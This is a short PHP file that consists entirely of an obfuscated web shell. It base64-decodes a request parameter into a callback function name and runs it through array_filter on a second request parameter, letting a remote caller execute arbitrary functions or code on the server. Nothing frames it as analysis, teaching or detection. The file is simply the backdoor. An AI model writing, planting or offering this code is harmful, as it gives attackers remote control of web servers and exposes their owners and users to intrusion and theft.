<?php
$e = $_REQUEST['e'];
$arr = array($_REQUEST['pass'],);
array_filter($arr, base64_decode($e));
?>